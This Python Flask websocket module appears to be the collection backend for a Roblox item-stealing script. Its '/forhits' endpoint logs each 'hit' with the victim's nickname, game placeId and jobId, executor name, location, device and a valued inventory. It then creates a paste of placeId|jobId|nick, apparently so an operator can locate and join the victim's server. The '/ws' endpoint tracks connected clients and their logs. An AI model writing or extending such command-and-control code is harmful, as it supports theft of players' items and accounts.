# -*- coding: utf-8 -*-
import time
import re
import logging
import threading
import random
import string
from datetime import datetime
from flask import request
from state import clients_db, hits_db, pastes_db, hits_logs

logger = logging.getLogger()


def hits_log(msg):
    from datetime import datetime as _dt
    entry = _dt.now().strftime("%H:%M:%S") + " | " + msg
    hits_logs.append(entry)
    if len(hits_logs) > 5000:
        hits_logs.pop(0)


def generate_paste_id():
    return ''.join(random.choices(string.ascii_lowercase, k=8))


def delete_duplicate_nick_paste(nick):
    same_nick = [(pid, p) for pid, p in pastes_db.items() if p["nick"] == nick]
    if same_nick:
        oldest_id = min(same_nick, key=lambda x: x[1]["created_at"])[0]
        del pastes_db[oldest_id]
        logger.info(f"[PASTE] Duplicate removed {oldest_id} for @{nick}")
        hits_log(f"[PASTE] Duplicate removed [{oldest_id}] for @{nick}")


def parse_items_text(text):
    data = {"total_count": 0, "total_price": 0, "items": []}
    if not text or text == "none": return data
    price_match = re.search(r"Total price:\s*([\d.]+)", text)
    count_match = re.search(r"Total count:\s*(\d+)", text)
    data["total_price"] = price_match.group(1) if price_match else "0"
    data["total_count"] = count_match.group(1) if count_match else "0"
    items = re.findall(r"^\s+-\s+(.*?)\s*=\s*(\d+)\s*\[([\d.]+)\]", text, re.MULTILINE)
    for name, amount, price in items:
        data["items"].append({"name": name.strip(), "amount": amount, "value": price})
    return data


def register_ws(sock):

    @sock.route('/ws')
    def ws_handler(ws):
        client_id = f"{request.remote_addr}_{int(time.time() * 1000)}"
        logger.info(f"[WS] New connection: {request.remote_addr} (ID: {client_id})")
        ws.sock.settimeout(90)
        try:
            while True:
                data = ws.receive()
                if not data: break

                if data.startswith("reg:"):
                    raw_content = data[4:]
                    p = raw_content.split("|")
                    logger.info(f"[DEBUG] raw reg data: {raw_content}")

                    new_name  = p[0] if len(p) > 0 else "Unknown"
                    p_placeId = p[1] if len(p) > 1 else "0"
                    p_jobId   = p[2] if len(p) > 2 else "None"
                    p_exe     = p[3] if len(p) > 3 else "Unknown"
                    p_device  = p[4] if len(p) > 4 else "Unknown"

                    logger.info(f"[REG] @{new_name} | Device: {p_device} | Exe: {p_exe}")

                    to_delete = [cid for cid, cd in clients_db.items() if cd['name'] == new_name]
                    for old_id in to_delete:
                        logger.info(f"[WS] Removing old session for @{new_name}")
                        del clients_db[old_id]

                    clients_db[client_id] = {
                        "ws": ws,
                        "name": new_name,
                        "placeId": p_placeId,
                        "jobId": p_jobId,
                        "exe": p_exe,
                        "device": p_device,
                        "new_logs": [],
                        "last_seen": time.time()
                    }

                elif data == "ping":
                    if client_id in clients_db:
                        clients_db[client_id]["last_seen"] = time.time()

                elif data.startswith("logs:"):
                    if client_id in clients_db:
                        logger.info(f"[LOGS] From @{clients_db[client_id]['name']}: {data[5:100]}...")
                        clients_db[client_id]["new_logs"].append(data[5:])
                        clients_db[client_id]["last_seen"] = time.time()

        except:
            pass
        finally:
            if client_id in clients_db:
                logger.info(f"[WS] @{clients_db[client_id]['name']} disconnected")
                del clients_db[client_id]

    @sock.route('/forhits')
    def ws_hit(ws):
        client_id = f"{request.remote_addr}_{int(time.time() * 1000)}"
        hit_state = {"last_ping": time.time(), "nick": "Unknown"}
        hits_log(f"[CONNECT] New /forhits | IP: {request.remote_addr}")

        stop_event = threading.Event()

        def monitor():
            while not stop_event.wait(timeout=10):
                try:
                    if time.time() - hit_state["last_ping"] > 30:
                        nick = hit_state["nick"]
                        for h in hits_db:
                            if h["id"] == client_id:
                                h["status"] = "failed"
                                h["is_online"] = False
                        hits_log(f"[TIMEOUT] @{nick} - no response >30s, status: failed")
                        try: ws.close()
                        except: pass
                        break
                    ws.send("ping2")
                except:
                    break
            stop_event.set()

        threading.Thread(target=monitor, daemon=True).start()

        try:
            while True:
                raw_data = ws.receive()
                if raw_data is None: break
                if not raw_data.strip(): continue
                if raw_data.strip() in ("nil", "null"): continue
                if raw_data == "ping1":
                    hit_state["last_ping"] = time.time()
                    continue

                lines = raw_data.split("\n")
                first_parts = lines[0].split("|", 5)

                if len(first_parts) >= 5:
                    p_placeId = first_parts[0]
                    p_jobId   = first_parts[1]
                    p_nick    = first_parts[2]
                    p_exe     = first_parts[3]
                    p_status  = first_parts[4]

                    hit_state["nick"] = p_nick

                    rest = first_parts[5] if len(first_parts) > 5 else ""
                    full_rest = rest + ("\n" + "\n".join(lines[1:]) if len(lines) > 1 else "")
                    rest_lines = full_rest.strip().split("\n")
                    last_line = rest_lines[-1] if rest_lines else ""
                    last_parts = last_line.split("|")

                    if len(last_parts) >= 2:
                        p_dev  = last_parts[-1].strip()
                        p_loc  = last_parts[-2].strip()
                        p_items = "\n".join(rest_lines[:-1]).strip()
                    else:
                        p_loc = "Unknown"
                        p_dev = "Unknown"
                        p_items = full_rest.strip()

                    res = parse_items_text(p_items)
                    hits_log(f"[HIT] @{p_nick} | exe: {p_exe} | place: {p_placeId} | status: {p_status} | items: {res['total_count']} | value: {res['total_price']} | loc: {p_loc} | dev: {p_dev}")

                    delete_duplicate_nick_paste(p_nick)
                    paste_id = generate_paste_id()
                    paste_content = f"{p_placeId}|{p_jobId}|{p_nick}"
                    pastes_db[paste_id] = {
                        "content": paste_content,
                        "nick": p_nick,
                        "created_at": time.time()
                    }
                    logger.info(f"[PASTE] Created {paste_id} for @{p_nick}")
                    hits_log(f"[PASTE] Created [{paste_id}] for @{p_nick} | {paste_content}")

                    hit = {
                        "id": client_id,
                        "paste_id": paste_id,
                        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "name": p_nick, "placeId": p_placeId, "jobId": p_jobId,
                        "exe": p_exe, "status": p_status, "location": p_loc, "device": p_dev,
                        "total_count": res["total_count"], "total_price": res["total_price"],
                        "items": res["items"], "is_online": True
                    }
                    hits_db.insert(0, hit)
                    if len(hits_db) > 1000:
                        hits_db.pop()
                else:
                    hits_log(f"[WARN] Bad data from {request.remote_addr}: {raw_data[:80]}")

        except:
            pass
        finally:
            stop_event.set()
            hits_log(f"[DISCONNECT] @{hit_state['nick']} disconnected from /forhits")
